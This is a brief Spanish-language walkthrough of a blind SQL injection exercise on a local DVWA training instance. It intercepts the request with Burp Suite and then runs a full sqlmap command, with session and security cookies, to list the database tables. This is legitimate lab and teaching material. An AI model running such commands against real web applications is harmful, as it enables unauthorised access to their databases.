# SQL Injection

## Descripción del reto

Este nivel no tiene cambios significativos que el nivel medio, ya que solo deberiamos cambiar los parametros del comando como las cookies de seguridad y PHPSESSID.

## Explotación de la vulnerabilidad

1. Para explotar esta vulnerabilidad vamos a intercepar la petición con burpsuit para ver como se envia.

![SQLIBlind](/img/SQLIBlind/Captura1.png)

2. Como se puede observar se ultilizan las cookies de PHPSESSID y security. Por lo tanto vamos a usar la herramienta sqlmap juntanto con estas cookies.

```bash
sqlmap -u "http://mi.local/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit# --cookie="security=lo; PHPSESSID=08524993c5f4d3c81931b340f7580c1" -D dvwa --tables -batch
```

![SQLIBlind](/img/SQLIBlind/Captura2.png)

Y en el resultado podemos ver las dos tablas que hay en esta base de datos.
